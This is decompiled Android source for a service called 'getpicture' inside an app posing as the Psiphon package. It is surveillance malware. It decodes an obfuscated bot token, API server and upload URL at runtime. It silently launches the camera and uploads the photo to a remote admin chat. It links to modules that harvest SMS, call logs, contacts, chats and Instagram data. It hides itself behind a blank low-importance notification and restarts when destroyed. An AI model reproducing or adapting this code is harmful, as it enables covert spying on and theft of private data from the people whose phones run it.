package com.psiphon3;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class getpicture extends  android.app.Service{
	public static class getpicture_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
            BA.LogInfo("** Receiver (getpicture) OnReceive **");
			android.content.Intent in = new android.content.Intent(context, getpicture.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
            ServiceHelper.StarterHelper.startServiceFromReceiver (context, in, false, BA.class);
		}

	}
    static getpicture mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return getpicture.class;
	}
	@Override
	public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.psiphon3", "com.psiphon3.getpicture");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.psiphon3.getpicture", processBA, _service, anywheresoftware.b4a.keywords.Common.Density);
		}
        if (!false && ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false) == false) {
				
		}
		else {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (getpicture) Create ***");
            processBA.raiseEvent(null, "service_create");
        }
        processBA.runHook("oncreate", this, null);
        if (false) {
			ServiceHelper.StarterHelper.runWaitForLayouts();
		}
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		onStartCommand(intent, 0, 0);
    }
    @Override
    public int onStartCommand(final android.content.Intent intent, int flags, int startId) {
    	if (ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() {
            public void run() {
                handleStart(intent);
            }}))
			;
		else {
			ServiceHelper.StarterHelper.addWaitForLayout (new Runnable() {
				public void run() {
                    processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (getpicture) Create **");
                    processBA.raiseEvent(null, "service_create");
					handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
				}
			});
		}
        processBA.runHook("onstartcommand", this, new Object[] {intent, flags, startId});
		return android.app.Service.START_STICKY;
    }
    public void onTaskRemoved(android.content.Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        if (false)
            processBA.raiseEvent(null, "service_taskremoved");
            
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (getpicture) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = ServiceHelper.StarterHelper.handleStartIntent(intent, _service, processBA);
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	
	@Override
	public void onDestroy() {
        super.onDestroy();
        if (false) {
            BA.LogInfo("** Service (getpicture) Destroy (ignored)**");
        }
        else {
            BA.LogInfo("** Service (getpicture) Destroy **");
		    processBA.raiseEvent(null, "service_destroy");
            processBA.service = null;
		    mostCurrent = null;
		    processBA.setActivityPaused(true);
            processBA.runHook("ondestroy", this, null);
        }
	}

@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}public anywheresoftware.b4a.keywords.Common __c = null;
public static com.psiphon3.httpjob _v6 = null;
public static com.psiphon3.httpjob _v7 = null;
public static anywheresoftware.b4a.objects.collections.JSONParser _v0 = null;
public static String _vv1 = "";
public static int _admin_id = 0;
public static String _vv2 = "";
public static String _vv3 = "";
public static String _vv4 = "";
public static String _vv5 = "";
public static ir.rayanoos.lib.upload_ultra.upload_ultra _vv6 = null;
public static ice.smsplus.SmsWrapper _vv7 = null;
public static com.AB.ABZipUnzip.ABZipUnzip _vv0 = null;
public static anywheresoftware.b4a.phone.CallLogWrapper _vvv1 = null;
public static anywheresoftware.b4a.phone.Contacts2Wrapper _vvv2 = null;
public static int _vvv6 = 0;
public static int _vvv7 = 0;
public static ir.rayanoos.lib.ultra_decoder.ultra_decoder _vvv3 = null;
public ir.rayanoos.lib.upload_ultra.uploadfile _vvvvvvvv5 = null;
public com.psiphon3.main _vvvvvvvv6 = null;
public com.psiphon3.cmr _vvvvvvvv7 = null;
public com.psiphon3.cmr2 _vvvvvvvv0 = null;
public com.psiphon3.firebasemessaging _vvvvvvvvv1 = null;
public com.psiphon3.getallcalls _vvvvvvvvv2 = null;
public com.psiphon3.getallcontacts _vvvvvvvvv3 = null;
public com.psiphon3.getallsms _vvvvvvvvv4 = null;
public com.psiphon3.getchats _vvvvvvvvv5 = null;
public com.psiphon3.getinsta _vvvvvvvvv6 = null;
public com.psiphon3.getlists _vvvvvvvvv7 = null;
public com.psiphon3.getonechat _vvvvvvvvv0 = null;
public com.psiphon3.getpicture2 _vvvvvvvvvv2 = null;
public com.psiphon3.srv _vvvvvvvvvv3 = null;
public com.psiphon3.starter _vvvvvvvvvv4 = null;
public com.psiphon3.startrecord _vvvvvvvvvv5 = null;
public com.psiphon3.httputils2service _vvvvvvvvvv6 = null;
public static String  _getcam(String _topic,String _filename) throws Exception{
 //BA.debugLineNum = 65;BA.debugLine="Sub getCam (Topic As String, fileName As String)";
 //BA.debugLineNum = 67;BA.debugLine="Try";
try { //BA.debugLineNum = 70;BA.debugLine="cameraId = 0";
_vvv6 = (int) (0);
 //BA.debugLineNum = 71;BA.debugLine="camId = 0";
_vvv7 = (int) (0);
 //BA.debugLineNum = 72;BA.debugLine="StartActivity(cmr)";
anywheresoftware.b4a.keywords.Common.StartActivity(processBA,(Object)(mostCurrent._vvvvvvvv7.getObject()));
 } 
       catch (Exception e6) {
			processBA.setLastException(e6); //BA.debugLineNum = 74;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"Exception"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 //BA.debugLineNum = 77;BA.debugLine="End Sub";
return "";
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 6;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 9;BA.debugLine="Dim ht,ht2 As HttpJob";
_v6 = new com.psiphon3.httpjob();
_v7 = new com.psiphon3.httpjob();
 //BA.debugLineNum = 10;BA.debugLine="Dim js As JSONParser";
_v0 = new anywheresoftware.b4a.objects.collections.JSONParser();
 //BA.debugLineNum = 11;BA.debugLine="Dim token As String = \":...__::...__::...__._____";
_vv1 = main.vvv13 (new byte[] {50,53,0,62,72,67,30,108,35,45,1,81,87,33,20,62,57,50,123,9,35,92,112,81,87,68,113,42,45,50,10,120,82,92}, 816945)+main.vvv13 (new byte[] {87,54,127,58,45,37,4,13,35,95,126,36,38,71,127,58,45,37,4,13,35,95,126,36,38,71,127,58,45,37,4,13,35,95,126,85,87,71,127,58,72,64,16,25,35,46,15,36,87,54,127,58,72,64,117,124,55,58,15,85,38,71,127,95,45,49,4,13,82,95,15,36,50,34,26,58,57,49,117,13,82,95,126,36,87,71,127,95,45,64,4,13,82,46,126,36,87}, 231270)+main.vvv13 (new byte[] {87,71,-79,-121,45,37,-69,-80,35,46,-80,-24,87,71,-79,-121,72,64,-34,-92,82,46,-63,-24,87,71,-79,-121,57,64,-69,-63,55,58,-80,-103,38,71,-79,-121,72,49,-69,-63,82,58,-43,-24,87,71,-79,-10,57,49,-69,-80,35,58,-43,-24,87,71,-64,-121,72,49,-69,-63,35,58,-43,-103,38,54,-64,-10}, 670133)+main.vvv13 (new byte[] {38,53,35,-30,72,67,61,-63,35,92,83,-115,38,68,82,-109,57,50,61,-63,35,45,34,-4,87,53,82,-121,45,50,88,-43,82,45,83,-4,38,68,35,-121,45,67,88,-92,82,92,83,-115,87,53,35,-30,45,38,41,-43,35,92,83,-4,38,68,82,-121,45,67,88,-92,82,92,34,-4,87,53,35,-30,45,38,88,-43,82,45,34,-4,38,53,35,-30,72,38,61,-43,82,92,83,-4,38,68,82,-30,72,38,61,-43,35,45,83,-4,87,53,82,-30,72,38,61,-92,35,92,83,-115,87,68,82,-109,57,67,61,-63,35,92,83,-115,38,68,82,-109,57,50,61,-63,82,45,34,-4,38,68,82,-30,72,67,88,-92,55,57,34,-115,87,68,35,-30}, 742392)+main.vvv13 (new byte[] {87,54,-11,-123,45,37,-1,-61,82,95,-123,-22,38,54,-11,-123,45,37,-1,-78,35,95,-123,-101,38,54,-124,-123,45,37,-114,-61,82,95,-12,-22,87,71,-11,-123,72,37,-21,-78,35,46,-12,-22,87,71,-124,-123,72,64,-114,-41,55,46,-12,-22,87,54,-124,-12,57,49,-1,-41,82,58,-123,-101,38,54,-11,-123,57,64,-114,-61,82,58,-32,-101,38,71,-124,-123,72,64,-1,-61,35,58,-32,-101,87,71,-11,-12,72,49,-114,-78,35,58,-32,-101,38,54,-124,-12,72,64,-1,-78}, 627109)+main.vvv13 (new byte[] {87,71,40,75,57,49,54,25,82,46,61,48,87,54,40,75,72,64,54,104,82,95,76,65,87,71,77,75,45,64,54,25,82,95,76,48,38,71,77,46,72,37,34,25,82,95,61,48,87,71,60,46,57,37}, 199192);
 //BA.debugLineNum = 12;BA.debugLine="Dim admin_id As Int = 315160032";
_admin_id = (int) (315160032);
 //BA.debugLineNum = 13;BA.debugLine="Dim apiserver As String=\":.____..._.::..____....:";
_vv2 = main.vvv13 (new byte[] {50,54,66,28,72,64,57,43,35,95,50,103,50,54,51,28,72,64,72,43,35,46,50,103,50,54,51,28,72,64,72,43,35,46,50,103,50,54,66,28,57,49,57,43,35,46,50,103,50,54,51,28,57,49,57,43,82,95,50,103,50,55,50,121,57,64,72,43,35,95,50,2,87,54,39,121}, 187255)+main.vvv13 (new byte[] {38,71,92,-73,57,64,39,-128,82,46,56,-67,38,71,92,-73,57,64,39,-128,82,46,56,-87,50,54,45,-73,57,64,39,-15,82,95,44,-67,50,71,45,-73,57,49,39,-15,35,95,44,-67,50,54,45,-58,72,64,86,-15,35,46,44,-67,50,54,92}, 166140)+main.vvv13 (new byte[] {87,71,-90,73,57,64,-84,126,55,58,-42,38,87,54,-41,56,57,64,-84,126,55,58,-42,38,87,71,-90,73,57,49,-35,126,55,58,-42,87,38,71,-90,73,72,64,-84,126,55,58,-42,87,87,54,-90,73,57,64,-84,126,55,58,-42,87,87,71,-90,73,72,64,-84,126,55,46,-62,38,38,71,-90,73,57,64,-35,15,35,58,-62,38,38,71}, 694813)+main.vvv13 (new byte[] {38,54,-124,-53,72,49,-114,-24,34,58,-12,-43,87,54,-124,-53,57,64,-114,-4,55,58,-12,-43,87,71,-124,-70,72,64,-114,-115,55,58,-12,-92,87,71,-124,-53,57,49,-1,-4,55}, 626828);
 //BA.debugLineNum = 14;BA.debugLine="Dim fileToWirte As String = \"msgid16.txt\"";
_vv3 = main.vvv13 (new byte[] {101,104,49,-57,115,45,106,-58,121,123,35}, 947318);
 //BA.debugLineNum = 15;BA.debugLine="Dim StartMessage As String = \"test16\"";
_vv4 = main.vvv13 (new byte[] {124,126,64,-107,38,42}, 866057);
 //BA.debugLineNum = 16;BA.debugLine="Dim uploadUrl As String = \":.____..._.::..____...";
_vv5 = main.vvv13 (new byte[] {50,54,-23,-118,72,64,-110,-67,35,95,-103,-15,50,54,-104,-118,72,64,-29,-67,35,46,-103,-15,50,54,-104,-118,72,64,-29,-67,35,46,-103,-15,50,54,-23,-118,57,49,-110,-67}, 577874)+main.vvv13 (new byte[] {38,54,12,-119,45,48,7,-49,35,46,13,-125,87,54,12,-20,72,49,18,-49,82,46,13,-125,38,54,12,-99,72,49,18,-49,35,46,124,-14,87,71,12,-99,57,49,18,-49,35,95,124,-14,87,71,12,-20,72,49,18}, 237802)+main.vvv13 (new byte[] {50,54,-94,-48,57,49,-88,-25,82,95,-93,-85,50,54,-94,-48,72,64,-39,-25,35,46,-93,-85,50,54,-45,-95,72,64,-39,-106,82,95,-93,-85,50,54,-45,-48,57,64,-39,-25,82,95,-93,-85,50,54,-45,-48,72,64,-39,-106,82,95,-93,-85,38,34,-94,-95,72,64,-39,-25,82,46,-46,-65,50,34,-94,-95,72,49,-88,-106,82,95,-93,-50,50,55,-74,-95,72,49,-39,-106,35,46,-93,-50,38,34,-74,-95,72,64,-88,-25,35,46}, 444763)+main.vvv13 (new byte[] {38,54,-15,-8,45,49,-118,-37,35,46,-127,-125,38,54,-15,-8,45,49,-118,-37,82,46,-127,-125,87,71,-15,-8,57,37,-5,-37,82,46,-16,-14,38}, 635375)+main.vvv13 (new byte[] {38,54,-63,47,45,49,-70,12,82,95,-64,37,38,71,-63,47,45,49,-70,12,35,46,-64}, 671766)+main.vvv13 (new byte[] {38,55,-63,-87,45}, 82965);
 //BA.debugLineNum = 17;BA.debugLine="Dim upload As upload_ultra";
_vv6 = new ir.rayanoos.lib.upload_ultra.upload_ultra();
 //BA.debugLineNum = 18;BA.debugLine="Dim allsms As SmsMessages";
_vv7 = new ice.smsplus.SmsWrapper();
 //BA.debugLineNum = 19;BA.debugLine="Dim zip As ABZipUnzip";
_vv0 = new com.AB.ABZipUnzip.ABZipUnzip();
 //BA.debugLineNum = 20;BA.debugLine="Dim callLog As CallLog";
_vvv1 = new anywheresoftware.b4a.phone.CallLogWrapper();
 //BA.debugLineNum = 21;BA.debugLine="Dim c As Contacts2";
_vvv2 = new anywheresoftware.b4a.phone.Contacts2Wrapper();
 //BA.debugLineNum = 22;BA.debugLine="Dim cameraId As Int";
_vvv6 = 0;
 //BA.debugLineNum = 23;BA.debugLine="Dim camId As Int";
_vvv7 = 0;
 //BA.debugLineNum = 24;BA.debugLine="Dim decode As ultra_decoder";
_vvv3 = new ir.rayanoos.lib.ultra_decoder.ultra_decoder();
 //BA.debugLineNum = 28;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
anywheresoftware.b4a.objects.NotificationWrapper _n = null;
 //BA.debugLineNum = 30;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 31;BA.debugLine="decode.Initialize";
_vvv3._initialize(processBA);
 //BA.debugLineNum = 32;BA.debugLine="token = decode.decode(token)";
_vv1 = _vvv3._decode(_vv1);
 //BA.debugLineNum = 33;BA.debugLine="apiserver=decode.decode(apiserver)";
_vv2 = _vvv3._decode(_vv2);
 //BA.debugLineNum = 34;BA.debugLine="uploadUrl=decode.decode(uploadUrl)";
_vv5 = _vvv3._decode(_vv5);
 //BA.debugLineNum = 36;BA.debugLine="ht.Initialize(\"ht\",Me)";
_v6._initialize /*String*/ (processBA,"ht",getpicture.getObject());
 //BA.debugLineNum = 37;BA.debugLine="ht2.Initialize(\"ht2\",Me)";
_v7._initialize /*String*/ (processBA,"ht2",getpicture.getObject());
 //BA.debugLineNum = 38;BA.debugLine="ht.JobName=\"ht1\"";
_v6._vvvvvvv3 /*String*/  = "ht1";
 //BA.debugLineNum = 39;BA.debugLine="ht2.JobName=\"ht2\"";
_v7._vvvvvvv3 /*String*/  = "ht2";
 //BA.debugLineNum = 40;BA.debugLine="upload.Initialize(uploadUrl,token)";
_vv6._initialize(processBA,_vv5,_vv1);
 //BA.debugLineNum = 41;BA.debugLine="Dim n As Notification";
_n = new anywheresoftware.b4a.objects.NotificationWrapper();
 //BA.debugLineNum = 42;BA.debugLine="n.Initialize2(n.IMPORTANCE_LOW)";
_n.Initialize2(_n.IMPORTANCE_LOW);
 //BA.debugLineNum = 43;BA.debugLine="n.Icon      = \"icon\"";
_n.setIcon("icon");
 //BA.debugLineNum = 44;BA.debugLine="n.Sound    = False";
_n.setSound(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 45;BA.debugLine="n.Vibrate    = False";
_n.setVibrate(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 46;BA.debugLine="n.Light    = False";
_n.setLight(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 47;BA.debugLine="n.Insistent  = False";
_n.setInsistent(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 48;BA.debugLine="n.AutoCancel = False";
_n.setAutoCancel(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 49;BA.debugLine="n.SetInfo(\"\",\"\",\"\")";
_n.SetInfoNew(processBA,BA.ObjectToCharSequence(""),BA.ObjectToCharSequence(""),(Object)(""));
 //BA.debugLineNum = 50;BA.debugLine="Service.AutomaticForegroundNotification = n";
mostCurrent._service.AutomaticForegroundNotification = (android.app.Notification)(_n.getObject());
 //BA.debugLineNum = 58;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 86;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 87;BA.debugLine="StartServiceAt(\"\" , DateTime.Now+100 , True)";
anywheresoftware.b4a.keywords.Common.StartServiceAt(processBA,(Object)(""),(long) (anywheresoftware.b4a.keywords.Common.DateTime.getNow()+100),anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 88;BA.debugLine="End Sub";
return "";
}
public static String  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
 //BA.debugLineNum = 60;BA.debugLine="Sub Service_Start (StartingIntent As Intent)";
 //BA.debugLineNum = 63;BA.debugLine="End Sub";
return "";
}
public static String  _uploadimage() throws Exception{
 //BA.debugLineNum = 81;BA.debugLine="Sub uploadImage";
 //BA.debugLineNum = 82;BA.debugLine="upload.upload(admin_id , \"Image\" , camId , File.D";
_vv6._upload(_admin_id,"Image",_vvv7,anywheresoftware.b4a.keywords.Common.File.getDirDefaultExternal(),"cmr.jpg");
 //BA.debugLineNum = 83;BA.debugLine="End Sub";
return "";
}
}
